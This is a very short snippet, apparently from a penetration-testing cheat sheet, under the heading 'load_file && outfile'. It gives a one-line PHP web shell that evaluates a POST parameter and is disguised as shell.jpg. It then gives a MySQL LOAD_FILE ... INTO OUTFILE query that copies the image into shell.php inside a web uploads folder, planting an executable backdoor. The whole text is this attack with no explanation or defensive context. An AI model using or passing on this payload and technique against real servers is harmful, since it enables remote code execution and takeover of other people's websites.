## load_file && outfile
``` bash
//shell.jpg content is <?php @eval($_POST[value]);?>
select LOAD_FILE("D:\\www\\uploads\\images\\shell.jpg") into OUTFILE "D:\\www\\uploads\\images\\shell.php";
```
